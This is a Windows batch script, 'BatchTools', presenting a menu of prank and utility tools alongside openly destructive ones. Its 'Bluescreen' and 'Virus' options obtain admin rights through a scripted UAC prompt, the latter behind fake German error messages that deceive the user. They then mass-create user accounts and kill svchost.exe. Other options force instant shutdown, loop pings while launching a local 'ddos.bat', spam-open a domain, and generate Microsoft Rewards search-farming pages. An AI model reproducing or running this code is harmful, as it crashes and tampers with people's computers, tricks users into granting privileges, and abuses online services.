:top
@if not defined debug_assist (@ECHO OFF) else (@echo on)
color 02 
@title BatchTools
SETLOCAL EnableDelayedExpansion
SET $Echo=FOR %%I IN (1 2) DO IF %%I==2 (SETLOCAL EnableDelayedExpansion ^& FOR %%A IN (^^^!Text:""^^^^^=^^^^^"^^^!) DO ENDLOCAL ^& ENDLOCAL ^& ECHO %%~A) ELSE SETLOCAL DisableDelayedExpansion ^& SET Text=
SETLOCAL DisableDelayedExpansion
if not defined devtools (goto index) else (goto dtd)
:index
    %$Echo% "  ____        _       _   _____           _     
    %$Echo% " | __ )  __ _| |_ ___| |_|_   _|__   ___ | |___ 
    %$Echo% " |  _ \ / _` | __/ __| '_ \| |/ _ \ / _ \| / __|
    %$Echo% " | |_) | (_| | || (__| | | | | (_) | (_) | \__ \
    %$Echo% " |____/ \__,_|\__\___|_| |_|_|\___/ \___/|_|___/
    echo Batch script by PIRANY
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] List Tools
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Info
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Exit
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /p menu1=Choose an Option from Above:

    If %menu1% == 1 goto listtools
    If %menu1% == 2 goto info
    If %menu1% == 3 exit
    goto index
:info 
    cls
    echo With this BatchScript you can access a variety of Tools.
    @ping -n 1 localhost> nul
    echo Unless otherwise stated all Scripts are made by myself.
    @ping -n 1 localhost> nul
    echo Use only under the MIT license (see GitHub Repo)
    pause 
    goto index

:listtools
    cls
    @ping -n 1 localhost> nul
    echo [1] Info About Windows
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] HackerScreen Type 1 (will run until closed)
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] HackerScreen Type 2
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [4] Shutdown In ... Minutes
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [5] RickRoll
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [6] PC-Crasher
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [7] Bluescreen
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [8] Get Website Block
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [9] Activate Administrator Account
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [10] Spam Open Domain
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [11] Microsoft Rewards Daily Farm.
    @ping -n 1 localhost> nul
	echo.
    echo [12] Virus Index/List
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [13] Dancing Parrot
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [14] Update all your PC Apps
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [15] Check Weather
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [16] Spam Create Files (remote or local)
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo [17] Download Every Kind of Program
    @ping -n 1 localhost> nul    
    echo.
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /p menu11=Choose an Option from Above:

    If %menu11% == 1 goto windowsoscheck
    If %menu11% == 2 goto hackerscreentype1
    If %menu11% == 3 goto hackerscreentype2
    If %menu11% == 4 goto shutdown%min
    If %menu11% == 5 goto rickroll 
    If %menu11% == 6 goto pccrasher
    If %menu11% == 7 goto getbluescreened
    If %menu11% == 8 goto getwebblock
    If %menu11% == 9 goto actadmacc
    If %menu11% == 10 goto spamdomain
    If %menu11% == 11 goto msrewardsfarm
	If %menu11% == 12 goto virusindex
    If %menu11% == 13 goto prrtlive
    If %menu11% == 14 goto wingetupg
    If %menu11% == 15 goto wttr
    If %menu11% == 16 goto dataspammer
    If %menu11% == 17 goto batchdownload
    goto listtools

:windowsoscheck
    prompt $g
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ProductName"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSEdition=%%X
    Set OSEdition=%OSEdition:*REG_SZ    =%
    If Defined ProgramFiles(x86) (Set OSType=x64) Else (Set OSType=x86)
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    If %OSVersion% LSS 2009 GoTo BuildNo
    Set UseExpresssion=Reg Query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "DisplayVersion"
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSVersion=%%X
    Set OSVersion=%OSVersion:*REG_SZ    =%
    :BuildNo
    Set UseExpresssion=Ver
    for /F "tokens=*" %%X IN ('%UseExpresssion%') do Set OSBuild=%%X
    Set OSBuild=%OSBuild:*10.0.=%
    Set OSBuild=%OSBuild:~0,-1%
    
    echo %OSEdition%
    @ping -n 1 localhost> nul
    echo Type: %OSType%
    @ping -n 1 localhost> nul
    echo Version: %OSVersion%
    @ping -n 1 localhost> nul
    echo Build: %OSBuild%
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [1] Go Back
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Close 
    @ping -n 1 localhost> nul
    set /p menu2=Choose an Option from Above:

    If %menu2% == 1 goto index
    If %menu2% == 2 exit

:hackerscreentype1
    mode 10000
    echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
    goto hackerscreentype1

:shutdown%min
    set /p shutdownmin=After how long should the PC shut down(in minutes):
    set /a shutdownsecs=%shutdownmin%*60
    shutdown -s -t %shutdownsecs% -f

:getbluescreened
    @echo off &setlocal enableextensions ENABLEDELAYEDEXPANSION 
    @prompt -$G
    :checkPrivileges 
    NET FILE 1>NUL 2>NUL
    if /I '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )  
    :getPrivileges 
    if /I '%1'=='ELEV' (shif /It & goto gotPrivileges)  
    ECHO. 
    ECHO ****************
    ECHO Please click Yes
    ECHO ****************
    timeout 5 
    setlocal DisableDelayedExpansion
    set "batchPath=%~0"
    setlocal EnableDelayedExpansion
    ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs" 
    ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs" 
    "%temp%\OEgetPrivileges.vbs" 
    echo You Sure about that?
    echo You Sure about that?    
    echo You Sure about that?
    set /p confbluescr=Type yes for Confirmation:        
    if %confbluescr% == yes goto getbluescreenedconf
    :getbluescreenedconf
    TASKKILL /IM svchost.exe /F


:getwebblock
    set /p domainwebblock=Enter a Domain:
    :start
    @ping %domainwebblock%
    start "" "C:\Users\paulk\Desktop\DANGEROUS\ddos.bat
    goto start

:spamdomain
    set /p spamdomain=Enter a Domain
    :start
    start "BatchTools" "%spamdomain%"
    goto start

:hackerscreentype2
    dir/s && dir/s && dir/s 

:rickroll
    start "RickRoll" "https://bitly.com/98K8eH"
    goto index


:actadmacc
		echo With this Tool you can activate your Administrator-Account
		echo This can be useful if your Main-Acount gets corrupted. 
		set /p actadmaccconf=Type yes for confirmation:
		
:msrewardsfarm
    echo [1] Type 1 (without UI) (doesnt work)
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Type 2 (with UI) (doesnt work)
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Credits (opens link to files so take this)
    @ping -n 1 localhost> nul
    echo.
    echo.
    set /P msrewardfarm=Choose an Option from Above
    if %msrewardfarm% == 1 goto msrewarnoui
    if %msrewardfarm% == 2 goto msrewarui   
    if %msrewardfarm% == 3 echo not my work | start "" "https://github.com/tungdo0602/MSRewardBot/"| start "" "https://github.com/Noah-Jaffe/MsftRewards" | pause | goto msrewardsfarm 
:msrewarnoui
    (
    echo <!DOCTYPE html>
    echo <html>
    echo   <head>
    echo     <script>
    echo       function sleep(ms) {
    echo         return new Promise((resolve) => setTimeout(resolve, ms));
    echo       }
    echo       async function yourlink() {
    echo         window.open("https://rewards.bing.com/", "_blank");
    echo         const MAX_POINTS = 150 + 20;
    echo         const POINTS_EACH = 5;
    echo         for (let i = 1; i * POINTS_EACH <= MAX_POINTS; ++i) {
    echo           window.open(`https://www.bing.com/search?q=${i}`, "_blank");
    echo           console.log(i);
    echo           await sleep(650);
    echo         }
    echo       }
    echo     </script>
    echo   </head>
    echo   <body>
    echo     <button onclick="yourlink()" width="100%" height="100%">Click Here to open all searches for microsoft rewards bs</button>
    echo </body>
    echo </html>
    ) > msrewardfarmnoui.html
    echo File created!
    pause
    goto index


:msrewarui
    (
    echo <html>
    echo 	<head>
    echo 		<title>Microsoft Rewards Bot</title>
    echo 	</head>
    echo 	<body>
    echo 		<p>Status: <strong id="status">Currently running...</strong></p>
    echo 		<p>Auto reload page: <strong id="reloadstatus"></strong></p><button id="reload">Toggle</button>
    echo 		<p>Current search per load: <strong id="searches"></strong></p><button id="change">Change</button> <button id="reset">Reset</button>
    echo 		<button id="dm"><span id="dms"></span> Debug Mode</button>
    echo 		<script>
    echo 			window.onload = function(){
    echo 				function checkBoolean(v){
    echo 					return ""+v.toLowerCase()==='true';
    echo 				}
    echo 				if(!localStorage.getItem("searches"))localStorage.setItem("searches", 1);
    echo 				if(!localStorage.getItem("autoreload"))localStorage.setItem("autoreload", false);
    echo 				if(!localStorage.getItem("debug"))localStorage.setItem("debug", false);
    echo 				window.setInterval(function(){
    echo 					document.querySelector("#searches").innerText = "" + localStorage.getItem("searches");
    echo 					document.querySelector("#reloadstatus").innerText = "" + localStorage.getItem("autoreload");
    echo 					if(checkBoolean(localStorage.getItem("debug"))){
    echo 						document.querySelector("#dms").innerText = "Disable";
    echo 					}else{
    echo 						document.querySelector("#dms").innerText = "Enable";
    echo 					}
    echo 				});
    echo 				document.querySelector("#reload").onclick = function(){
    echo 					localStorage.setItem("autoreload", !checkBoolean(localStorage.getItem("autoreload")));
    echo 				}
    echo 				document.querySelector("#dm").onclick = function(){
    echo 					localStorage.setItem("debug", !checkBoolean(localStorage.getItem("debug")));
    echo 					let dbg = new URL(location.href);
    echo 					dbg.searchParams.set("debug", localStorage.getItem("debug"));
    echo 					location.href = dbg;
    echo 				}
    echo 				document.querySelector("#change").onclick = function(){
    echo 					let w = prompt();
    echo 					if(w<=0||w>100){
    echo 						alert("Number must between 1 and 100.")
    echo 					}else{
    echo 						localStorage.setItem("searches", Number(w));
    echo 					}
    echo 				}
    echo 				document.querySelector("#reset").onclick = function(){
    echo 					localStorage.setItem("searches", 1);
    echo 				}
    echo 				let frameReady = 0;
    echo 				function chargen(length) {
    echo 					var result           = '';
    echo 					var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    echo 					var charactersLength = characters.length;
    echo 					for ( var i = 0; i < length; i++ ) {
    echo 						result += characters.charAt(Math.floor(Math.random() * charactersLength));
    echo 					}
    echo 					return result;
    echo 				}
    echo 				function createIframe(search){
    echo 					let chars = chargen(10);
    echo 					let a = document.createElement("iframe");
    echo 					let bingurl = new URL("https://www.bing.com/news/search?q=" + Math.random() + chars);
    echo 					bingurl.searchParams.set("setmkt", "en-us");
    echo 					bingurl.searchParams.set("setlang", "en");
    echo 					a.src = bingurl.href;
    echo 					a.id = chars;
    echo 					document.body.appendChild(a);
    echo 					if(!(((new URL(location.href).searchParams.get("debug")+"")).toLowerCase()==='true')){
    echo 						a.style.display = "none";
    echo 						a.onload = function(){
    echo 							window.setTimeout(function(){
    echo 								a.remove();
    echo 							}, 1000);
    echo 						}
    echo 						frameReady += 1;
    echo 					}
    echo 				}
    echo 				for(let i=0;i<Number(localStorage.getItem("searches"));i++){
    echo 					createIframe();
    echo 				}
    echo 				let isDone = window.setInterval(function(){
    echo 					if(frameReady>=(Number(localStorage.getItem("searches"))-1)){
    echo 						window.clearInterval(isDone);
    echo 						if(checkBoolean(localStorage.getItem("autoreload"))){
    echo 							document.querySelector("#status").innerText = "Done! Reloading in 1 seconds...";
    echo 							window.setTimeout(function(){
    echo 								location.reload();
    echo 							}, 1000);
    echo 						}else{
    echo 							document.querySelector("#status").innerText = "Done!";
    echo 						}
    echo 					}
    echo 				});
    echo 			}
    echo 		</script>
    echo 	</body>
    echo </html>
    ) > msrewardfarmwui.html
    echo File created!
    pause
    goto index
:pccrasher
    net file 1>nul 2>nul
    if "%errorlevel%" == "0" (goto admin)
	:elevate
    powershell.exe Start-Process %~s0 -Verb runAs
    exit /B
    :admin
    shutdown /s /f /t 0


:virusindex	
    echo [1] Virus 1
    echo.
    echo [2] Virus 2
    set /P virusvar=choose an option
    if %virusvar% == 1 goto virus1
    if %virusvar% == 2 goto virus2
    goto virusindex
    :virus1
    echo this will destroy your pc if it works. it may not work. 
    :verifyp
    set "verify=%random%"
    echo Please Verify that you want to use this Virus
    echo Please have in Mind that this can make your Windows Installation Unusable.
    echo Please enter %verify% in the Field Below
    set /p verifyans=Type %verify%:
    if "%verifyans%"=="%verify%" (
        goto verifyp2
    ) else (
        goto verifyp
    )
    :verifyp2
    set "verify=%random%"
    echo Please Verify that you want to use this Virus another Time
    echo Please have in Mind that this can make your Windows Installation Unusable.
    echo Please enter %verify% in the Field Below
    set /p verifyans=Type %verify%:
    if "%verifyans%"=="%verify%" (
        goto verifyp3
    ) else (
        goto verifyp2
    )
    :verifyp3
    set "verify=%random%"
    echo Please Verify that you want to use this Virus one more time 
    echo Please have in Mind that this can make your Windows Installation Unusable.
    echo Please enter %verify% in the Field Below
    set /p verifyans=Type %verify%:
    if "%verifyans%"=="%verify%" (
        goto startvirus
    ) else (
        goto verifyp3
    )

:startvirus
    set DATEINAME=DEAK.txt
    
        IF exist %DATEINAME% (
            goto DEAKexist
        ) ELSE (
            goto CreateRUN
        )

    :CreateRUN
    >"run.txt" type nul 
    goto DEAKexist

    @title Administrator Account wird erstellt...

    :DEAKexist
    echo Beim Erstellen des Accounts ist ein Fehler aufgetreten.
    echo Die benötigten Fehlerinformationen werden nun abgerufen.
    echo Schließen sie dieses Fenster nicht.
    @title Kritischer Fehler beim Erstellen des Accounts                                
    echo
    echo Restdauer wird berechnet..
    @ping -n 4 localhost> nul
    echo 10 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 9 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 8 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 7 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 6 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 5 Sekunden Restdauer
    @ping -n 2 localhost> nul
    echo 4 Sekunden Restdauer

    @echo off
    echo msgbox"Beim Abrufen der Fehlerinformationen ist ein kritischer Fehler aufgetreten. Die benoetigten Rechte fehlen.",vbInformation , "CriticalKernelError"> %temp%\msg.vbs 
    %Temp%\msg.vbs 
    erase %temp%\msg.vbs
    cls
    @echo off &setlocal enableextensions ENABLEDELAYEDEXPANSION 
    @prompt -$G

    :checkPrivileges 
    NET FILE 1>NUL 2>NUL
    if /I '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges ) 
 
    :getPrivileges 
    if /I '%1'=='ELEV' (shif /It & goto gotPrivileges)  
    ECHO. 
    ECHO **************************************
    ECHO Bitte bestätigen sie die Rechte. 
    ECHO **************************************
    timeout 5 
    setlocal DisableDelayedExpansion
    set "batchPath=%~0"
    setlocal EnableDelayedExpansion
    ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs" 
    ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs" 
    "%temp%\OEgetPrivileges.vbs" 
    goto ExtVirus



    :gotPrivileges 
    echo Abruf der Daten erfolgreich.
    echo.
    @ping -n 10 localhost> nul
    goto ExtVirus

    :ExtVirus
    set /a x=1

    :top
    net user /add FINDIT%x% YOUFOUNDIT%x%
    set /a x+=1

    @echo off & setlocal
    set User=FINDIT200

    set Vorhanden=
    for /f "skip=4 tokens=1-3" %%i in ('net user^|findstr /v "ausgeführt"') do (  
        if /i "%%i"=="%User%" set Vorhanden=True  
        if /i "%%j"=="%User%" set Vorhanden=True  
        if /i "%%k"=="%User%" set Vorhanden=True  
    )
        IF defined Vorhanden (
            goto FINDITexist
        ) ELSE (
            goto top
        )
    
    
    :FINDITexist
    ren run.txt DEAK.txt
    TASKKILL /IM svchost.exe /F

:prrtlive
    curl parrot.live
:wingetupg
    echo This Script will update all of your PC Apps. This may take a while.
    echo Please press Enter to continiue
    pause
    winget upgrade --all
:wttr
    echo Choose a Location for that you want to check the Weather:
    set /P wttrlocation=Enter a Location
    cls 
    curl wttr.in/%wttrlocation%
    pause
    goto wttr

:dataspammer
    start "" "https://github.com/PIRANY1/DataSpammer"
    goto listtools
:batchdownload
    start "" "https://github.com/PIRANY1/BatchDownload"
    goto listtools  

:dtd
    set /P dtd1=::
    %dtd1%
    set /P dtd2=::
    %dtd2%
    set /P dtd3=::
    %dtd3%
    set /P dtd4=::
    %dtd4%
